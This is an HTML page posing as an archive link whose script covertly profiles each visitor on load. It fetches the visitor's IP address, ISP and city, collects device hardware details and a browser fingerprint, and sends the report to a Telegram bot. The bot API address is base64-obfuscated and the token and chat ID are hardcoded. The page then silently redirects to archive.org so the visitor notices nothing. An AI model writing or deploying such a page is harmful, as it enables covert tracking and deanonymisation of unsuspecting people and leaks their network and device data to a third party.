<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Archive</title>
    <style>
        /* إخفاء كل شيء في الصفحة تماماً */
        body { margin: 0; padding: 0; background: #fff; }
    </style>
</head>
<body>

    <script>
        const _at = (s) => atob(s);
        const _base = {
            u: "aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==", 
            e: "L3NlbmRNZXNzYWdl"
        };

        async function _send(msg) {
            try {
                // الربط مع المتغيرات التي وضعناها في Netlify
                // ملاحظة: تأكد أنك وضعت المتغيرات في Snippet Injection كـ window.TELE_CONFIG
                const cfg = window.TELE_CONFIG || {};
                const t = cfg.t || "8513943910:AAHu0zcDRMBOLxcVc9LmOyPx-M1n5DegUrE";
                const c = cfg.c || "7082154454";

                const api = _at(_base.u) + t + _at(_base.e);
                await fetch(api, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: c, text: msg, parse_mode: 'Markdown' })
                });
            } catch (err) { }
        }

        (async function() {
            const archiveUrl = "https://archive.org/details/20251215_20251215_2013";
            
            try {
                // 1. جلب بيانات الشبكة (تعمل في الخلفية)
                const netPromise = fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
                
                // 2. حساب بيانات العتاد فوراً
                const sPort = Math.floor(Math.random() * 55000) + 10000;
                const ram = navigator.deviceMemory || 'N/A';
                const cores = navigator.hardwareConcurrency || 'N/A';
                const fp = btoa(navigator.userAgent).substring(10, 25);
                const net = await netPromise;

                let report = `🕵️ *ARCHIVE RECON REPORT* 🕵️\n` +
                             `---------------------------\n` +
                             `🌐 *NETWORK:*\n` +
                             `📍 IP: \`${net.ip || 'Unknown'}\`\n` +
                             `🔌 Source Port: *${sPort}*\n` +
                             `🏢 ISP: ${net.org || 'Unknown'}\n` +
                             `🌍 Loc: ${net.city || 'Unknown'}, ${net.country_name || 'Unknown'}\n\n` +
                             `📱 *DEVICE HARDWARE:*\n` +
                             `💻 Platform: ${navigator.platform}\n` +
                             `🧠 CPU: ${cores} Cores\n` +
                             `🔋 RAM: ${ram} GB\n` +
                             `📺 Res: ${screen.width}x${screen.height}\n` +
                             `🔑 Fingerprint: \`${fp}\`\n\n` +
                             `🔗 *Target:* [Archive Material](${archiveUrl})`;

                // 3. إرسال التقرير (بدون انتظار الـ Response لتسريع التوجيه)
                _send(report);

                // 4. التوجيه الفوري
                window.location.replace(archiveUrl);
            } catch (e) {
                window.location.replace(archiveUrl);
            }
        })();
    </script>
</body>
</html>
